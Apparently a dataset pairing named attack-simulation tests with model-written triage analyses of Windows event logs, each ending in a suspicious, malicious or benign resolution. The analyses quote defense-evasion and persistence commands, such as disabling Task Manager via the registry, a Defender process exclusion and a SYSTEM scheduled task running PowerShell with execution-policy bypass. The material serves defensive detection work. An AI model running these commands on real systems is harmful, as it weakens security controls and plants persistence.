- **Confirm Edge Update Validity:** While typical for updates, corroborate the update activity aligns with scheduled maintenance or updates as expected by IT policy.
- **Conduct User and Action Verification:** Cross-reference logs with any manual or automated tasks executed by administrators in the given timeframe to affirm intentions and permissions.
- **Enable Monitoring and Alerts:** Set up alerts and monitoring for registry changes and PowerShell executions to catch any untended or unauthorized manipulations swiftly.
"
Disable Windows Lock Workstation Feature,"Upon reviewing the provided Windows event logs, several key observations can be noted:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:** 
   - The logs show multiple instances of `wevtutil.exe` being executed, which is used for managing event logs on a Windows system. This can be legitimate during administrative tasks; however, frequent and rapid invocations, especially without clear documentation or context, might be indicative of attempts to access or manipulate the event logs which could suggest an effort to cover tracks.

2. **Use of `whoami.exe` and `hostname.exe`:** 
   - The use of `whoami.exe` and `hostname.exe` can sometimes occur in automated scripts or during legitimate administrative activities to gather system information. Given their high integrity level and proximity to other potentially suspicious activities, further investigation may be warranted to ascertain the intention behind their usage.

3. **Registry Modification using `cmd.exe`:** 
   - A command was executed to change a registry setting to disable workstation lock (`DisableLockWorkstation`). This action is suspicious because altering this particular registry value could imply an attempt to maintain access to the system without interruption due to lock policies. Such behavior is often observed in scenarios where an attacker wants uninterrupted control over a compromised system.

4. **`MicrosoftEdgeUpdate.exe` Executions:**
   - Multiple executions of the `MicrosoftEdgeUpdate.exe` under `NT AUTHORITY\SYSTEM` context indicate a legitimate scheduled or forced update process for Microsoft Edge. However, the volume and frequency of these events, as well as their presence in temporary directories, might warrant further scrutiny to ensure they are not being used in a Trojan horse type of attack. The integrity of these files (e.g., checking the actual hashes against known good values) should be verified.

5. **Lack of Other Logs:**
   - The absence of entries in Security, PowerShell, and System logs could either be due to genuinely no actions corresponding to those logs happening within the timeframe or deliberate log clearing activities. A missing Security log can be worrisome as it may imply log tampering to hide malicious attempts.

**Assessment**
- The combination of registry changes, extensive use of `wevtutil.exe`, and high-frequency Edge update executions require further investigation.

**Potential Risks:**
- Unauthorized modification of registry settings to weaken security.
- Exploitation of `wevtutil.exe` for log tampering.
- Potential use of legitimate update processes for malicious purposes.

**Guidance on Proceedings:**
1. **Verification:** 
   - Check the integrity of any command and binaries involved, especially those that modify system behavior or are invoked multiple times rapidly.
   - Cross-reference available MD5/SHA256 hashes with trusted databases (e.g., VirusTotal) for the files used.

2. **User Accounts and Privileges:**
   - Investigate the user account `SERVER002\admin_test` for any unusual login activities or privilege escalations.
  
3. **Logs Review:**
   - Attempt to recover any Security or other potential missing logs to ascertain any other activities.
   - Monitor future activities closely on this host for similar patterns.

4. **Security Audit:**
   - Conduct a thorough audit of the newly modified registry settings.
   - Examine change management records to ensure this was an approved and documented change.

Based on the detailed analysis, the resolution for this log would be categorized as:
- **SUSPICIOUS** - The activities observed suggest potential misconfigurations or unauthorized modifications that require deeper analysis to rule out malicious intent or actions."
Regasm Uninstall Method Call Test,"Based on the provided Windows event logs, here are the key findings from different logs that were available for review:

### Application Log:
- The logs show standard application-level entries such as the stopping of the ""edgeupdate"" service. This is common behavior for scheduled updates and does not inherently indicate any suspicious activity.

### Sysmon Log:
1. **Microsoft Edge Update Activity**:
    - Multiple processes involving ""MicrosoftEdgeUpdate.exe"" were recorded. The command lines such as `/svc`, `/c`, `/ping`, `/update`, `/regsvc`, and `/regserver` suggest routine update operations which are typical for Microsoft Edge auto-update mechanisms.
    - These operations were performed under the ""NT AUTHORITY\SYSTEM"" user context, which is normal for system-level service executables.

2. **Process Creation and Execution Patterns**:
    - The occurrence of processes like `whoami.exe`, `cmd.exe`, and PowerShell (`powershell.exe`) in association with the same user (SERVER002\admin_test) could indicate user activity that requires further scrutiny. The specific command line captured when cmd.exe was executed seems to involve compiling C# code using csc.exe.
    - Specifically, the utilization of commands through `cmd.exe` to execute other actions involving the .NET compiler (csc.exe) and `regasm.exe` suggests the compilation and potential registration of a .NET assembly dynamically. This behavior can be part of normal operations for development purposes but could also indicate a compromise strategy if performed without proper authorization or operational context.

3. **Suspicious Indicators**:
    - The compiled assembly (`data.009.dll`) in a temporary directory followed by its registration and unregistration (as indicated by `regasm.exe /U`) are tricky behaviors. These actions could be indicative of malicious activity, especially if conducted without explicit user-initiated actions or required business processes. This suggests a potential attempt at privilege escalation or persistence mechanism through untrusted/unverified code execution.

### Overall Assessment:
The log evidence doesn't inherently confirm malicious activity with absolute certainty, but several patterns suggest that deeper investigation is warranted:
- The extensive creation and execution of Microsoft Edge Update processes are typical, but the activity around .NET compilation and registration in temporary directories paired with command-line executions could indicate possibly unwanted operations or compromised behavior.
- The suspicious use of development and administration tools (`csc.exe`, `cmd.exe`, `regasm.exe`, `wevtutil.exe`) in the context provided necessitates a deliberate exploration into the source and motivation behind such operations.

### Resolution:
**SUSPICIOUS** - The logs reveal activities that don't align with typical user operations and could imply unauthorized administrative actions. Monitoring and an investigation are needed to ensure there aren't any unknown scripts or user accounts conducting these tasks improperly, and validate if the processes were part of legitimate administrative or development operations."
Disable Windows Task Manager application,"### Analysis of Logs

#### Application Log:
1. **Software Protection Platform Service (Event ID 16384):** 
   - This event indicates typical runtime of the Software Protection Platform Service, which doesn't show any direct sign of malicious activity.
   
2. **EdgeUpdate Service Stopped (Event ID 0):**
   - These entries indicate the stopping of the EdgeUpdate service at two points. Service stopping and starting can be normal in software updates but repeated stops could suggest something abnormal if associated with an unexpected trigger.

#### Security Log:
1. **Security-Auditing (Event ID 4616):** 
   - This indicates a system time change, logged by `svchost.exe`. System time changes can be related to legitimate time synchronization processes but could also be used by malicious entities to evade detection. The process here (`svchost.exe`) is a common Windows process, which doesn't look suspicious on its own.

#### Sysmon Log:
1. **Multiple Process Creations:**
   - Several legitimate Windows processes were initiated, such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`. The usage of `cmd.exe` with the command to disable Task Manager (`reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f`) is anomalous and potentially associated with a malicious attempt to limit system monitoring or control. This action could indicate unauthorized changes typically not performed in benign environments.
   
2. **Microsoft Edge Update Activities:**
   - Numerous activities related to Microsoft Edge Update were logged. While updates often involve multiple process creations and some temporary changes, tracking them in non-standard locations like `C:\\Program Files (x86)\\Microsoft\\Temp\\EUBCAF.tmp\\` and commands hinting towards unrestricted access (`/c`, `/ua`, `/regserver`) could be suspicious.

3. **`whoami.exe` and `hostname.exe`:**
   - Execution of these commands can be standard but may also be used by attackers for reconnaissance or enumeration post-compromise.

#### System Log:
1. **Kernel-General and Time-Service:**
   - These events generally represent system-level activities like time changes and timestamps adjustments. The synchronization with `time.windows.com` is fairly standard but requires context considering other concurrent events like those in the Sysmon logs.

### Assessment
- **Suspicious Process Behaviors:** The use of `cmd.exe` to disable Task Manager highlights a potentially malicious alteration of system settings. Additionally, the unconventional paths and frequent creations of EdgeUpdate processes, alongside concurrent legitimate queries like `whoami.exe`, suggest suspicious motives, likely requiring further verification.
- **System Time Adjustment:** Though common for synchronization objectives, its proximity to other suspicious behaviors might warrant concern and examination in detail.
  
### Resolution:
**SUSPICIOUS** - The logs contain activities that do not look right, especially the disabling of Task Manager through a command-line script, which suggests the need for further investigation to rule out potential compromise or unauthorized configuration changes.

### Guidance on Proceeding:
1. **Conduct a Detailed Review:** Investigate the source and triggering of the `cmd.exe` command, understanding if there's a legitimate script or user action behind it.
2. **Verify User Actions:** Confirm with the user `admin_test` about their activities to eliminate or confirm their involvement or victimization in the suspicious activities.
3. **Run Anti-Malware Scans:** Utilize security tools to perform comprehensive scans to detect any persistently evading threats.
4. **Monitor System Changes:** Continuously monitor for any further suspicious time changes or process activities.
5. **Assess and Tighten Security Policies:** Implement stricter policies against command-line operations that can disable security controls like Task Manager, reducing potential exploitation surfaces. 

These actions will help ascertain whether the anomalies are a sign of an actual threat or false positives stemming from unusual yet benign configurations."
Do Not Connect To Win Update,"### Analysis of Provided Logs

#### System Logs:
1. **Time Synchronization:**
   - Multiple events from Microsoft-Windows-Kernel-General and Microsoft-Windows-Time-Service indicate time synchronization activities. The process associated is `svchost.exe`, running under `LOCAL SERVICE` account. These events appear to be routine and expected during time synchronization processes in Windows.

#### Sysmon Logs:
1. **Process Executions:**
   - **whoami.exe Execution:**
     - EventID 5 for `whoami.exe` executed by `SERVER002\admin_test` and high integrity level, which is common during user account verifications and isn't suspicious on its own.
   - **wevtutil.exe Execution:**
     - Multiple instances of `wevtutil.exe` with `conhost.exe` as a child process executed by the same user (`SERVER002\admin_test`). `wevtutil.exe` is typically used for managing windows event logs. These entries suggest frequent queries or manipulations to event logs, which can sometimes be indicative of someone attempting to clear logs to hide other activities.
   - **Registry Modification:**
     - The execution of `cmd.exe` with the command to modify the Windows Update group policy setting is notable. It's modifying `""DoNotConnectToWindowsUpdateInternetLocations""` to disable checking Windows Update Internet locations. This type of modification could be an indicator of an attempt to prevent updates, which is sometimes performed to avoid patching vulnerabilities.

#### Security Logs:
1. **Time Change Events:**
   - EventID 4616 involves time change events managed by `svchost.exe` process. These entries correspond with System log entries and seem to indicate legitimate time adjustments rather than an unauthorized action.

#### Application Logs:
1. **Software Protection Platform Service:**
   - Indicates the regular operation of the Software Protection Platform Service, resulting in no direct indication of malicious activity.

### Assessment
Upon reviewing the logs for suspicious activity, the following conclusions are drawn:

- **Unusual Use of `wevtutil.exe`:** The frequent execution of `wevtutil.exe` is somewhat suspicious, potentially indicating attempts to manage or clear event logs by a user account (`SERVER002\admin_test`), which could be legitimate system administration activity but also warrants further investigation, particularly if this account has been potentially misused.
  
- **Registry Modification via `cmd.exe`:** The modification of registry settings that influence Windows Update behavior is concerning. Typically, such modifications can lead to systems not receiving critical updates, thereby increasing security risk.

### Final Resolution
- **Resolution: SUSPICIOUS**

### Recommendations
1. **Further Investigation:**
   - Review account activity for `SERVER002\admin_test` for legitimacy, particularly surrounding `wevtutil.exe` executions.
   - Check if this behavior aligns with known or authorized administrative tasks.
   - Verify if recent administrative controls or policies endorsed such registry modifications.
   
2. **Monitor for Additional Indicators:**
   - Set up monitoring for further suspicious use of utilities such as `wevtutil.exe` and audit registry changes.
   
3. **Security Policies:**
   - Ensure policies are in place that alert on registry changes related to critical Windows settings.
   - Educate users and administrators on secure configuration and the impact of changes to update settings. 

The identified anomalies warrant further probing to determine the context of activities and to ensure that no malicious activities are being masked by legitimate-looking administrative tasks."
File Extension Masquerading,"**Analysis of Windows Event Logs:**

Upon reviewing the provided logs across various event channels, several indicators of potentially malicious activity were identified:

**1. Security Logs:**
   - Multiple Event ID 5379 logs indicate failed credential operations involving the `MicrosoftAccount:user=02txoixylodcstop` with `ReturnCode 3221226021`, suggesting failed attempts to access or authenticate using a Microsoft account possibly attempting enumeration or probing for credentials.

   - Event ID 4624 logs, represent successful logons. Event IDs related to privileged logons and Event ID 4672 indicate special privileges were assigned during the logon session (SeDebugPrivilege, SeLoadDriverPrivilege, etc.). These can be leveraged for privilege escalation.

**2. Windows PowerShell Logs:**
   - Execution of PowerShell scripts with suspicious filenames like `data.003_masquerading.doc.ps1`, `data.003_masquerading.pdf.ps1`, and others. These scripts are executed from a temporary location, which is often seen in malware activities attempting to disguise script execution as legitimate documents (e.g., masquerading techniques).

**3. Sysmon Logs:**
   - There are indications of file copying and execution of files under misleading names such as `data.003_masquerading.docx.exe`, `data.003_masquerading.pdf.exe`, etc., which are copies of `calc.exe`, a legitimate file. This is indicative of masquerading attacks where legitimate binaries are used to disguise malware.
   
   - Abnormal execution of various script interpreters (such as `wscript.exe`) and execution of PowerShell scripts from a temporary folder path which is often associated with obfuscation techniques used by malware.
   
   - The command line construction via `cmd.exe` demonstrates the use of orchestrated copy and execution chains that include PowerShell scripts and potentially malicious applications disguised as documents or scripts.

**Assessment and Risk:**
   - The logs indicate a strong likelihood of malicious activity, primarily focused around the use of masquerading techniques with scripts and executable files. This pattern follows common tactics used in malware delivery and execution.

   - The attempts to gather credentials and special privileges being assigned could be indicative of lateral movement attempts or preparation for further exploitation.

**Recommendation:**
   - Immediately isolate the affected host to prevent any further lateral movement or credential theft.
   - Conduct a thorough forensic investigation including the examination of scripts and executables identified in these logs to understand their intended purpose or payload.
   - Review account permissions and application whitelisting policies to prevent unauthorized scripts and executables from running.
   - Consider conducting a wider network sweep to ascertain if other systems have been compromised using similar tactics.

**Resolution:** MALICIOUS - The logs contain clear indicators of malicious activity."
Register Portable Virtualbox,"After carefully analyzing the event logs provided, I have identified various processes and activities that occur on the system. Here is a detailed analysis of the logs with a focus on identifying any potential indicators of malicious activity:

### Suspicious or Anomalous Behavior:

1. **Frequent Use of Administrative Tools:**
   - There is repeated execution of `wevtutil.exe`, which is a command-line tool used to manage event logs and is often used by attackers to delete or modify logs to cover their tracks.
   - Numerous instances of `conhost.exe` are running quickly in succession, which can sometimes indicate scripting or automation. However, `conhost.exe` is frequently paired with legitimate Windows console applications and might be benign if associated with normal command-line usage.

2. **PowerShell Activity:**
   - PowerShell is executed to download a file using `Invoke-WebRequest`. This can be a legitimate administrative task or it can be used for malicious purposes (e.g., to download a payload).
   - The command downloads a file from an external URL (GitHub). Downloading files from external sources should be scrutinized to ensure they are legitimate and authorized.

3. **Execution of Compromising Commands:**
   - The `cmd.exe` executed with command-line instructions for VirtualBox that include registering DLLs and creating/start services, might indicate software installation or updates but should be verified to ensure it's authorized.
   - There is the command `msiexec.exe` used with `/V` switch which could be indicative of an installation process that might require scrutiny especially given it's executed alongside other suspicious activities.

4. **Unknown Executables:**
   - The appearance of `RUXIMICS.exe` and related processes should be verified. It claims to be part of Microsoft's UX Interaction Manager but should be verified especially if unusual or unexpected on the given server.
   - The process `RUXIMICS.exe` seems to interact with `PLUGScheduler.exe`, its legitimate status should be verified.

5. **Potential Privilege Escalation or Unusual Access:**
   - Security logs indicating privilege escalation (`Event ID 4672`) were found. The elevated privileges like `SeDebugPrivilege` might be normal system operation for SYSTEM process but should be verified in context.
   - The usage of elevated privileges and SYSTEM user context for executing multiple critical processes should be further examined.

### Indicators of Malicious Activity or Compromise:

- The combination of activities: excessive administrative utilities, PowerShell download from an external source, service creation, and usage of system-level privileges can indicate potential malicious intent, especially when considered in aggregate.
- The use of PowerShell with web requests is a common method used in Living Off the Land Binaries and Scripts (LOLBAS) techniques.

## Assessment:

- **Resolution: SUSPICIOUS**

The logs contain activities and sequences that look suspicious, especially the use of `PowerShell` for downloading executable content, frequent execution of event log management tools, and the combination of various service configurations. Each of these items alone can often be benign tasks depending on the organization's context and policies but when considered together, suggest the need for further investigation to ensure the legitimacy of these actions.

## Guidance on How to Proceed:

1. **Verify Legitimate Activities:**
   - Confirm whether there's an authorised administrative task, patching, or new software deployment occurring that aligns with the observed events.
   
2. **Investigate External Connections:**
   - Analyze firewall and proxy logs to verify download activity and inspect any external connections during this time frame to ensure communications are with trusted sources.

3. **Conduct Threat Hunting:**
   - Look for anomalies or signatures elsewhere on the system or network that may align with known adversarial tactics.
   - Deploy host-based IDS/IPS to look for known signatures of malicious activity or similar footholds.

4. **Review User Credentials and Privileges:**
   - Ensure that the accounts observed were not used maliciously beyond their intended role, especially the admin_test account.
   
5. **Additional Monitoring:**
   - Set up alerts for similar activities going forward, especially repetitive use of system binaries known for dual-use, whether benign or malicious.

Conducting these steps will help determine the next course of action — whether to downgrade the alert to benign or confirm it as a malicious act requiring remediation."
Impair Windows Audit Log Policy,"After reviewing the provided logs, several concerning patterns indicate potential malicious activity:

1. **Wevtutil Execution**: We see multiple executions of `wevtutil.exe`, which is used to manage event logs. Frequent use of this utility by `SERVER002\\admin_test` without a clear legitimate purpose can be suspicious as it may indicate clearing or tampering with the logs to cover tracks of malicious activity.

2. **Audit Policy Changes**: The execution of `cmd.exe` with command-line arguments to disable audit policies related to logon and tracking is a significant red flag. This kind of activity is typically performed by malicious actors attempting to disable logging to hide their activities.

3. **Running Processes with Elevated Privileges**: Observing `auditpol.exe` commands run with commands aimed at disabling audit categories also aligns with the previous concern as it points towards an intentional effort to reduce the system's ability to keep track of user activities.

4. **System Time Change Events**: There are changes in the system time (`Security Event ID 4616` and `Kernel-General Event ID 1`) without clear justification. Time changes can be used maliciously to manipulate time-based event logs and fool forensic timelines.

5. **Continuous Use of Common Utilities**: Processes like `whoami.exe`, `hostname.exe`, and `conhost.exe` running with elevated privileges can sometimes indicate privilege escalation attempts, especially when they are not part of routine administrative tasks.

6. **Unusual Network Activity**: The presence of `MicrosoftEdgeUpdate.exe` running multiple times in quick succession with command-line arguments (`/update`, `/svc`, `/ping`) might be part of legitimate update checks, but given the audit policy changes and execution of `wevtutil.exe`, this activity should be verified against expected behavior.

The logs indicate activities consistent with attempts to hide tracks and potentially unauthorized actions taking place on the host. Disabling audit policies and possibly clearing logs can be indicative of efforts to conceal malicious operations.

### Resolution: **MALICIOUS**

### Guidance:
- Immediately perform a forensic analysis to determine the extent of the impact.
- Isolate the host from the network to prevent further potential damage.
- Restore audit policies to capture all necessary logging.
- Conduct a full review and audit of user privileges, focusing on `SERVER002\\admin_test`.
- Investigate processes and software running on the system to ensure none is compromised.
- Consider employing network-based detection to capture any further attempts to manipulate the system.

Further investigation is warranted to confirm these suspicions and remediate any discovered threats."
Delete an entire folder - Windows cmd,"Upon analyzing the provided Windows event logs, here's a breakdown of the events and the potential indicators of anomaly or threat:

1. **Use of Common Utilities**:
   - The logs show execution of standard Windows utilities such as `whoami.exe`, `cmd.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`. These utilities in themselves are not malicious and are commonly used for administrative tasks. 

2. **Cmd.exe Activity**:
   - There are several instances of `cmd.exe` executing commands to create, check existence, and remove directories within the temporary user directory. Commands like `IF EXIST`, `mkdir`, and `rmdir` are being used. This sequence of commands could be part of a cleanup script or automated task.
   - The command `wevtutil.exe` is also noted, likely used for managing event logs, which might suggest log management or cleanup activities.

3. **Process Lineage and Integrity Level**:
   - The processes show a high integrity level, typical for administrative or elevated tasks. The `wsmprovhost.exe` appears as a parent process, indicating these commands might be executed via Windows Management Instrumentation (WMI), which is often used for remote management.
   - The user context for these processes is consistently `SERVER002\\admin_test`, which implies that an administrative user executed these tasks. The consistent user and session IDs across the logs suggest a stable session, potentially an administrator performing routine tasks.
   
4. **Timing and Sequence**:
   - The events occur in quick succession, aligning with a script or automated task execution rather than manual entry due to the speed and precision of the commands.

5. **Absence of Malicious Indicators**:
   - No evidence of privilege escalation attempts, unauthorized access attempts, or execution of known malicious software is identified in the current logs.
   - Despite potential concerns about command usage, the actions seem aligned with typical management or cleanup tasks without clear evidence of nefarious intent.

### Assessment:
The logs display activities that could easily be interpreted as scheduled administrative tasks or scripts executed by an administrator due to the high privilege context and use of common system utilities. There is no explicit behavior markedly consistent with known malicious activities like malware execution, brute force attempts, privilege escalation exploits, or unauthorized software installations.

### Guidance:
- It would be beneficial to verify if there are scheduled tasks or scripts managed by the account `admin_test` that align with these logs.
- Ensure that WMI usage for administrative tasks aligns with organization policies and is duly documented.

### Resolution: BENIGN
The provided Windows event logs appear to contain benign activity related to administrative tasks and utility usage with no conclusive evidence of malicious actions. It is advisable to continue monitoring but prioritize threat detection for more overt indicators of compromise."
Lolbin Jsc.exe compile javascript to dll,"### Analysis of Windows Event Logs

Upon analyzing the provided Windows event logs, several observations can be made regarding potential indicators of suspicious or malicious activity:

1. **Security Log Observations:**
   - **Event ID 4624 & 4672 (Logon and Special Logon):** Multiple system service-related logons (Logon Type 5), where services.exe is listed as the process, this is typical for system startup and not inherently malicious. The presence of high-level privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) is necessary for system processes.
   - **Event ID 5379 (Credential Manager credentials read):** Multiple records showing attempts to access credentials of a Microsoft Account and a Windows Live token. Given the failed access (ReturnCode 3221226021 indicating ""Access Denied""), this is worth noting but not conclusively malicious without further context.
   - **Event ID 4798 (User/Group enumeration):** Enumerations by taskhostw.exe for several user accounts are typical in some administrative operations or application setups but warrant further investigation in the context it was executed.

2. **Sysmon Log Observations:**
   - **PowerShell Activity:** PowerShell execution (Event ID 5) with the user `SERVER002\admin_test` which aligns with potential administrative actions. However, the process chain (e.g., `wevtutil.exe` and associated command executions) suggests an investigation to determine if any scripts or commands executed are legitimate administrative tasks, since PowerShell exploitation is a common technique.
   - **Command-Line Execution:** Observed use of `cmd.exe` to compile a .js file into a library using `jsc.exe`. While not inherently malicious, this activity is unusual for typical system operations and may indicate an attempt to execute a custom script dynamically.
   - **Microsoft Edge Setup:**
     - Multiple instances of `setup.exe` for Edge update observed. It's possible these represent legitimate software updates being installed. Without any anomalies detected directly in these activities, they appear benign but routine checks for update authenticity are suggested.

3. **Application Logs:**
   - **Typical Logs:** Activation of Windows Defender, which is a normal occurrence during system operations and does not imply malicious activity on its own.
   
### Assessment and Conclusion

After reviewing the logs:

- **Credential Access**: Attempts to read credentials were denied, which is suspicious but without the necessary context to confirm malicious intent.
- **PowerShell and Command-Line Activity**: These should be verified against known administrative scripts. If unverified or unusual commands are found, this could point towards misuse.
- **User and Group Enumeration**: While sometimes a legitimate administrative operation, in some contexts, it could be part of a reconnaissance effort within the system.

Based on observed patterns and context, my recommendation for resolution is:

**Resolution: SUSPICIOUS**

The logs contain activities that warrant further investigation, specifically the PowerShell and cmd.exe activities, along with the failed credential access attempts. These activities need to be cross-examined with known behavior and administrator actions to rule out any potential compromise. Further inspecting the originating process for these activities or any potentially related network activity would provide more insight."
Windows Auto Update Option to Notify before download,"Upon reviewing the provided log entries, here is a detailed analysis of the activities and events captured in the logs:

### Security Logs:

1. **Time Change Events (Event ID 4616):**
   - The logs indicate that the time on the server was adjusted backward slightly (event IDs 30351 and 30352) by the `LOCAL SERVICE` account using the process `svchost.exe`. While time changes occasionally happen due to synchronization with time servers or administrative actions, repeated or unauthorized time changes can be an indicator of malicious activity meant to obscure log times.

2. **Logon Events (Event ID 4624) and Privilege Use (Event ID 4672):**
   - The user `admin_test` is involved in a `LogonType 3` event, which typically indicates a network logon (indicating remote access). The same account was granted special privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are commonly misused during privilege escalation attacks.
   - The presence of `SeDebugPrivilege` and similar rights in the `PrivilegeList` indicates the account can access and potentially manipulate other processes, which is a powerful level of access usually reserved for administrative purposes.

3. **Logoff Event (Event ID 4634):**
   - The `admin_test` account is shown logging off, which could be routine but is noteworthy in conjunction with other activities.

### Sysmon Logs:

1. **Process Creation (Event ID 1 and 5):**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` run by `admin_test` are logged. These are standard Windows processes; however, `wevtutil` is a command-line utility that can be used to query and manage event logs, raising suspicion that event logs may be being queried or altered.
   - A `cmd.exe` process with a command to change Windows Update settings through a registry edit (`reg.exe`) was executed. Altering registry settings can point to an attempt to disable or change update policies, often seen in persistence or defense evasion techniques.

### System Logs:

1. **Kernel-General Time Change (Event ID 1):**
   - Confirms the time changes but does not provide significant new information beyond what was noted in security logs.

### Application and PowerShell Logs:

- Application log entries related to `edgeupdate` indicate service stoppages but do not appear directly suspicious, as they seem related to routine application updates.
- No PowerShell logs were present, reducing insights into scripts or commands executed through this interface.

### Assessment:

- **Suspicious Activity Detected:** The presence of unusual and potentially malicious activities such as registry edits, time changes, and the execution of process-related utilities like `wevtutil.exe` executed remotely by a privileged account (`admin_test`) with additional privileges signals suspicious activity. This could be indicative of attempts to alter system configurations, conceal actions, or conduct reconnaissance.

### Final Resolution:

- **Resolution: SUSPICIOUS** - While there are indicators of unusual behavior and potential security concerns, there is not enough definitive evidence to confirm these as malicious without further investigation. Logs should be correlated with additional data (network logs, user account activity from a directory service) for more conclusive analysis.

### Recommendations:

1. **Detailed Review of User Activities:** Examine account `admin_test` activities and verify intended use and authorization. Check associated user login locations and times.
2. **Audit Time Change Justifications:** Verify if the time adjustments were authorized and correspond to known maintenance or network time protocol adjustments.
3. **Inspect Registry Changes:** Check the purpose and impact of changes to the Windows Update settings.
4. **Enhanced Monitoring:** Implement more robust logs and alerts for key actions like privilege escalations and process executions related to system utilities.
5. **Security Policy Review:** Reinforce credential policies and monitor for any signs of credential abuse or privilege escalation practices."
Tamper with Windows Defender Evade Scanning -Process,"### Detailed Analysis of Windows Event Logs

#### System Log
1. **Time Service and Windows Update:**
   - The system log primarily shows routine operations such as syncing with the time server and updating Microsoft Defender Antivirus. 
   - These activities are standard and expected for normal system maintenance, indicating the machine is maintaining time accuracy and up-to-date security definitions.

#### Sysmon Log
2. **Sysmon Process Creation and Network Activity:**
   - The execution of `wevtutil.exe` and `conhost.exe` is noted multiple times with the user `SERVER002\admin_test`. The `wevtutil.exe` is a legitimate utility for querying event logs, and `conhost.exe` is a legitimate system process for managing console windows.
   - The initiation of `hostname.exe` and `whoami.exe` seems legitimate as these are benign Windows tools. The use of `whoami.exe` can sometimes indicate a script checking for user context, but there is no indication of malicious activity here.
   - The execution of PowerShell with a command to exclude `outlook.exe` from Windows Defender (`Add-MpPreference -ExclusionProcess $excludedProcess`) could be suspicious. However, without additional context, this alone is insufficient to declare malicious intent.

3. **Continuous Edge Updates:**
   - There are multiple entries related to the execution of Microsoft Edge Update processes with various command-line arguments. This appears to be routine updating behavior for Microsoft Edge.

4. **Unusual PowerShell Activity:**
   - The command executed by PowerShell to exclude `outlook.exe` from real-time scanning is unusual. While the act of excluding a process from scanning is not inherently malicious, it warrants further investigation, particularly if this was unauthorized or unexpected behavior.
   
#### Application Log
5. **Security Product Activity:**
   - Entries such as ""Windows Defender, SECURITY_PRODUCT_STATE_ON"" indicate that Windows Defender is active.
   - A log entry shows ""Service stopped"" for `edgeupdate`, which aligns with the typical behavior seen during software updates.

#### Windows PowerShell Log
6. **PowerShell Execution Details:**
   - Lists multiple PowerShell sessions starting and stopping, which include a command to exclude `outlook.exe` from scanning. This activity strengthens the need for review to ensure legitimate usage.

#### Security Log
- **No entries were provided.**

### Assessment

- **Suspicious Activities Identified:** The use of PowerShell to exclude `outlook.exe` from Microsoft Defender real-time scanning is suspicious, and such behavior should be further investigated. It is crucial to verify whether this action was performed by an authorized user or application. 
- **No Clear Malicious Activities:** Aside from the potentially suspicious PowerShell activity, there is no evidence of overt malicious behavior such as privilege escalation, unauthorized access, or malware installation.

### Conclusion
- **Resolution: SUSPICIOUS**
  - The logs do not present direct evidence of malicious activity; however, the PowerShell command to modify Defender settings is a red flag that requires further examination.
  - **Next Steps:** Investigate the origin and authorization of the PowerShell command to determine if it was a legitimate administrative task or if it represents unauthorized activity. Additionally, corroborate with network logs or endpoint protection alerts if available to verify the intent and impact."
Indirect Command Execution - Scriptrunner.exe,"### Analysis of Logs:

Upon reviewing the provided Windows event logs, we will analyze the logs from different channels (Sysmon, Application, System, Security, and Windows PowerShell) to assess any potential indicators of compromise or malicious activity.

#### Sysmon Logs:
1. **Frequent Execution of System Utilities**: 
   - Frequent instances of `wevtutil.exe` and `conhost.exe` processes running under the user `SERVER002\\admin_test`. 
   - `wevtutil.exe` is legitimate software used for event log operations but excessive or unexpected usage might be suspect.
   - No suspicious command-line parameters are provided for `wevtutil.exe` or `conhost.exe`, reducing the immediate suspicion of misuse.

2. **PowerShell Execution**:
   - A notable event is the execution of PowerShell, indicating use of `Scriptrunner.exe` to invoke `calc.exe`.
   - The command is crafted to use a script runner, which can potentially be used for executing arbitrary commands or scripts.

3. **Process Execution Trace**:
   - Execution of `HOSTNAME.EXE`, `whoami.exe`, and `PowerShell` under admin context. These can be normal, but together with PowerShell, could be part of recon/testing by an attacker or admin task execution.

#### Application Logs:
1. **Microsoft Edge Update Service**:
   - Log entries related to Edge update services starting and stopping are observed, which is routine for updating embedded applications and not inherently suspicious unless executed at abnormal times or intervals.

#### System Logs:
1. **Time Change Events**:
   - The system time was changed. This can happen due to various reasons such as daylight savings adjustments or manual changes. Unexpected changes could indicate malicious intent.

2. **Kernel and Time Service Events**:
   - The logs reflect normal operations like time synchronization with an NTP server, suggesting no clear signs of stratum-level manipulation or malicious time-skew activities.

#### Security Logs:
1. **Time Change Auditing**:
   - The entries reflect the time adjustments made by the `LOCAL SERVICE`, correlating with the system logs, and can be typical of time synchronization processes.

#### Windows PowerShell Logs:
1. **PowerShell Activity**:
   - The use of `Scriptrunner.exe` with PowerShell to invoke `calc.exe`. While launching the calculator may seem harmless, it demonstrates the potential for PowerShell to execute more malicious commands.
   - PowerShell events show transitioning states and commands linked to Scriptrunner but lack specific malicious scripts indicating high-risk actions.

### Conclusion:
The logs indicate potentially suspicious activity due to the invocation of PowerShell using `Scriptrunner.exe` to start `calc.exe` and the frequent utility executions under an admin account. However, without explicit malicious commands or evidence of compromise, it's difficult to classify this as a confirmed incident.

### Resolution: **SUSPICIOUS**
- **Next Steps**: Further investigation is necessary to:
  - Verify the intention behind the use of `Scriptrunner.exe` with PowerShell.
  - Evaluate the context of repeated system utility executions.
  - Cross-reference with user activity logs and explore any clarifications with the responsible system administrator.
- **Recommendations**: Implement monitoring for repeated PowerShell usage with `Scriptrunner.exe` and similar patterns, flagging for more comprehensive contextual examinations."
Creating W32Time similar named service using schtasks,"### Detailed Analysis of Windows Event Logs

#### Observations:

1. **Processes and Execution**:
   - **Cmd.exe** is executing a scheduled task creation using `schtasks`, indicating the potential setup of a task that executes PowerShell with execution policy `bypass`. The specific command is:
     ```
     ""cmd.exe"" /c schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\\data.004_NonExistingScript.ps1"" /tn win32times /f & schtasks /query /tn win32times
     ```
     - The PowerShell script specified does not exist (`c:\\data.004_NonExistingScript.ps1`), which might suggest a failed or testing attempt by an attacker.
   
2. **Process Hierarchies and Users**:
   - **wevtutil.exe** and **conhost.exe** are frequently run by the user `SERVER002\\admin_test` in quick succession, which could be part of normal event log management operations, but the frequency and timing might indicate script execution or automated tasks.
